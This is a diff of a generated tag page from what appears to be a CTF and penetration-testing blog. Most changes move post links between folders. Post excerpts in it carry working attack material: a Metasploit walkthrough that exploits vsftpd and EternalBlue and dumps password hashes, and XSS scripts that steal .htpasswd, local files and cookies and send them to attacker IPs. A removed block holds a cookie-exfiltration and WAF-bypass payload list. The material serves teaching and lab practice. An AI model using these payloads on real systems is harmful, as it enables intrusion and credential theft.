@@ -181,7 +181,7 @@
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to Basic Reverse Shell Payloads" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/bash_command_revshell/"></a>
+  <a class="entry-link" aria-label="post link to Basic Reverse Shell Payloads" href="http://localhost:1313/posts/penetration-testing/webvulnerability/bash_command_revshell/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -208,7 +208,7 @@ id=[Nothing] id=&#39; id=&#39;&#39; id=&#34; id=` id=&#39;) id=&#34;) id=`) id=&
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to Comprehensive SQL Injection Vulnerability Exploration Tutorial" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/sql_injection_cheat_sheet/"></a>
+  <a class="entry-link" aria-label="post link to Comprehensive SQL Injection Vulnerability Exploration Tutorial" href="http://localhost:1313/posts/penetration-testing/webvulnerability/sql_injection_cheat_sheet/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -239,7 +239,7 @@ There are two different types. Local File Inclusion (LFI) where the application 
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>6 min</span></footer>
-  <a class="entry-link" aria-label="post link to File Inclusion" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/lfi/"></a>
+  <a class="entry-link" aria-label="post link to File Inclusion" href="http://localhost:1313/posts/penetration-testing/webvulnerability/lfi/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -254,7 +254,7 @@ Windows x64 Reverse Shell msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to Generating Reverse Shells with Metasploit&#39;s msfvenom." href="http://localhost:1313/posts/tipsandtricks/webvulnerability/metasploit_meterpreter_reverseshell/"></a>
+  <a class="entry-link" aria-label="post link to Generating Reverse Shells with Metasploit&#39;s msfvenom." href="http://localhost:1313/posts/penetration-testing/webvulnerability/metasploit_meterpreter_reverseshell/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -269,7 +269,20 @@ Windows x64 Reverse Shell msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>3 min</span></footer>
-  <a class="entry-link" aria-label="post link to HTTP Status Code" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/http_status_code/"></a>
+  <a class="entry-link" aria-label="post link to HTTP Status Code" href="http://localhost:1313/posts/penetration-testing/webvulnerability/http_status_code/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Metasploit Practical Guide (for Beginners and CTF use)
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>🌐 1.Start Metasploit Console sudo systemctl start postgresql msfconsole Initialize the Metasploit Database (First Time Only) msfdb init 🔍 2. Scanning Targets Quick Target Discovery nmap -sn 10.10.10.0/24 Full Port &#43; Version Scan (Integrated with Metasploit DB) db_nmap -sC -sV -O -Pn 10.10.10.129 View Discovered Hosts &amp; Services hosts services 🪡 3. Exploit Search and Module Use Search by service name or CVE search vsftpd search type:exploit name:smb Load a Module use exploit/unix/ftp/vsftpd_234_backdoor Explore Module Info info # Shows full module details (author, platform, options, etc) show options # Required &#43; optional settings (RHOSTS, LHOST, etc) show advanced # Advanced options like threads, timeouts, proxies show payloads # Compatible payloads for this exploit 💡 4. Linux Exploitation Workflow Example: FTP Backdoor use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 10.10.10.129 set payload cmd/unix/interact run If Shell is Basic: Upgrade python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; Or Use Web Delivery use exploit/multi/script/web_delivery set payload linux/x86/meterpreter/reverse_tcp set LHOST &lt;your_ip&gt; set LPORT 4444 run Post-Exploitation (Linux) sessions -i 1 getuid sysinfo Enumerate OS and Configs run post/linux/gather/enum_os run post/linux/gather/enum_configs Dump Password Hashes download /etc/passwd download /etc/shadow john shadow --wordlist=/usr/share/wordlists/rockyou.txt Local Exploit Suggestion run post/multi/recon/local_exploit_suggester Example Local Root Exploit use exploit/linux/local/dirty_cow set SESSION 1 run Confirm Root id whoami 💻 5. Windows Exploitation Workflow Example: EternalBlue use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.10.10.130 set LHOST &lt;your_ip&gt; set payload windows/x64/meterpreter/reverse_tcp run Session Handling sessions sessions -i 1 sysinfo getuid Post-Exploitation (Windows) Dump Hashes hashdump load kiwi kiwi_cmd &#34;lsadump::sam&#34; Process Migration ps migrate &lt;pid&gt; getpid Privilege Escalation getsystem Or use:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to Metasploit Practical Guide (for Beginners and CTF use)" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -288,7 +301,7 @@ PHP Payload: &lt;?php system($_GET[&#39;cmd&#39;]); echo &#39;Shell done!&#39;; 
 </p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to Payloads and Outputs" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/rce_via_lfi-php_wrappers/"></a>
+  <a class="entry-link" aria-label="post link to Payloads and Outputs" href="http://localhost:1313/posts/penetration-testing/webvulnerability/rce_via_lfi-php_wrappers/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -300,20 +313,7 @@ PHP Payload: &lt;?php system($_GET[&#39;cmd&#39;]); echo &#39;Shell done!&#39;; 
     <p> 1. Steal File Content Using Inline XSS Script (HTML) &lt;script&gt; fetch(&#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&#34;) .then(response =&gt; response.text()) .then(data =&gt; { fetch(&#34;http://10.10.14.228/?data=&#34; &#43; encodeURIComponent(data)); }) .catch(error =&gt; console.error(&#34;Error fetching the messages:&#34;, error)); &lt;/script&gt; Explanation: This script tries to read the .htpasswd file from a vulnerable server using a local file inclusion (LFI) or file read vulnerability in the URL parameter file. Then, it sends the stolen file content back to your attacker server (10.10.14.228) using an HTTP request with the data URL-encoded. Works in XSS vulnerable pages where you can inject JS. How to use: Inject this script into an XSS vulnerable parameter or stored XSS vector. Make sure your attacker machine (10.10.14.228) is ready to receive GET requests and log the data parameter. Example listener (using nc or a simple Python HTTP server) to capture data: nc -lvnp 80 # or python3 -m http.server 80 2. External JS File to Steal File Content via XSS (JavaScript) // Usage: // Spawn python HTTP server on attacker box: python3 -m http.server 1212 // Inject in vulnerable page: &lt;script src=&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;&gt;&lt;/script&gt; var url = &#34;http://127.0.0.1/dir/pass.txt&#34;; // Target file on victim var attacker = &#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;; var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { // send base64 encoded stolen content to attacker server fetch(attacker &#43; &#34;?&#34; &#43; encodeURI(btoa(xhr.responseText))) } } xhr.open(&#39;GET&#39;, url, true); xhr.send(null); Explanation: This script fetches a local file on the victim machine (http://127.0.0.1/dir/pass.txt) via the victim’s browser. When the file is fully loaded (DONE), it encodes the content in Base64 (btoa) to safely transmit binary or special characters. Then sends this encoded content back to attacker server by requesting the script file with data as query string (?data=...). Requires you to host this script on your attacker machine (10.9.179.230) and have an HTTP server running on port 1212. How to use: Start HTTP server on attacker box: python3 -m http.server 1212 Inject &lt;script src=&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;&gt;&lt;/script&gt; into an XSS vulnerable page. Monitor requests on your attacker server to capture the Base64 encoded file contents in the URL. Decode captured Base64 content: echo &#34;base64_encoded_string&#34; | base64 -d &gt; stolen_file.txt Summary Notes: These methods depend on the target browser having access to local files via URL paths (like 127.0.0.1) or vulnerable parameters (LFI). Base64 encoding helps send files safely in GET requests. Must have control over attacker server to catch stolen data. Use during CTF challenges, penetration testing, or in controlled environments. Always check the same-origin policy and CORS restrictions which may block requests in real-world targets. </p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to XSS File Stealing Cheat Sheet" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/xss-file-stealing-cheat-sheet/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">🛡️ XSS Payload Cheat Sheet
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>🎯 Basic Payloads &lt;svg/onload=&#34;alert(document.cookie)&#34;&gt; &lt;iframe src=&#34;data:image/svg&#43;xml;base64,CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI&#43;CiAgPGNpcmNsZSByPSIxMCIgY3g9IjEwIiBjeT0iMTAiIGZpbGw9ImdyZWVuIi8&#43;CiAgPGltYWdlIGhyZWY9IngiIG9uZXJyb3I9ImphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpIiAvPgo8L3N2Zz4=&#34;&gt;&lt;/iframe&gt; &lt;script&gt;var i=new Image(); i.src=&#34;http://10.10.14.54/?cookie=&#34;&#43;btoa(document.cookie);&lt;/script&gt; &lt;script&gt;var i=new Image;i.src=&#34;http://10.10.14.7:8888/?cookie=&#34;&#43;document.cookie;&lt;/script&gt; &lt;script&gt; document.write(&#39;&lt;img src=&#34;http://10.10.14.54/?cookie=&#39;&#43;document.cookie&#43;&#39;&#34; /&gt;&#39;); &lt;/script&gt; &lt;img src/onerror=this.src=&#34;http://10.10.14.74/?cookie=&#34;&#43;btoa(document.cookie)&gt; &lt;img src=&#34;http://10.10.14.54/&#34; onload=&#34;var i=0;if(i&#43;&#43;)this.src&#43;=&#39;?cookie=&#39;&#43;encodeURIComponent(document.cookie);&#34;/&gt; &lt;script&gt;fetch(&#39;http://10.10.14.19:8000/?cookie=&#39; &#43; btoa(document.cookie));&lt;/script&gt; 🧨 Local File Access / Script Injection &lt;img src=xasdasdasd onerror=&#34;document.write(&#39;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&#39;)&#34;/&gt; &lt;img src=gdgdgdfgert onerror=&#34;document.write(&#39;&lt;script src=http://127.0.0.1/test.js&gt;&lt;/script&gt;&#39;)&#34;/&gt; &lt;img src=x onerror=fetch(&#39;http://10.10.xx.xx/?cookie=&#39;&#43;document.cookie);&gt; 🕵️‍♂️ WAF Bypass Strings for XSS &lt;Img src = x onerror = &#34;javascript: window.onerror = alert; throw XSS&#34;&gt; &lt;Video&gt; &lt;source onerror = &#34;javascript: alert (XSS)&#34;&gt; &lt;Input value = &#34;XSS&#34; type = text&gt; &lt;applet code=&#34;javascript:confirm(document.cookie);&#34;&gt; &lt;isindex x=&#34;javascript:&#34; onmouseover=&#34;alert(XSS)&#34;&gt; &#34;&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt; &#34;&gt;&lt;img src=&#34;x:x&#34; onerror=&#34;alert(XSS)&#34;&gt; &#34;&gt;&lt;iframe src=&#34;javascript:alert(XSS)&#34;&gt; &lt;object data=&#34;javascript:alert(XSS)&#34;&gt; &lt;isindex type=image src=1 onerror=alert(XSS)&gt; &lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt; &lt;img src=&#34;x:gif&#34; onerror=&#34;window &#34;&gt;&lt;/img&gt; &lt;iframe/src=&#34;data:text/html,&lt;svg onload=alert(1)&gt;&#34;&gt; &lt;meta content=&#34;&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)&#34; http-equiv=&#34;refresh&#34;/&gt; &lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open(&#39;https://www.google.com/&#39;)&gt;&lt;/script &lt;meta http-equiv=&#34;refresh&#34; content=&#34;0;url=javascript:confirm(1)&#34;&gt; &lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt; &lt;form&gt;&lt;a href=&#34;javascript:\u0061lert(1)&#34;&gt;X &lt;/script&gt;&lt;img/*%00/src=&#34;worksinchrome&amp;colon;prompt(1)&#34;/%00*/onerror=&#39;eval(src)&#39;&gt; &lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt; 📚 Resources 🔗 OWASP XSS Filter Evasion Cheat Sheet
-</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🛡️ XSS Payload Cheat Sheet" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/xss_payload/"></a>
+  <a class="entry-link" aria-label="post link to XSS File Stealing Cheat Sheet" href="http://localhost:1313/posts/penetration-testing/webvulnerability/xss-file-stealing-cheat-sheet/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
@@ -349,7 +349,9 @@ PHP Payload: &lt;?php system($_GET[&#39;cmd&#39;]); echo &#39;Shell done!&#39;; 
 
     <section>
         <h2>Trending Tags</h2>
-                                                                                                                                                                                    
+              
+        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
+                                                                                                                                                                                                                                                            
         <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                    
     </section>
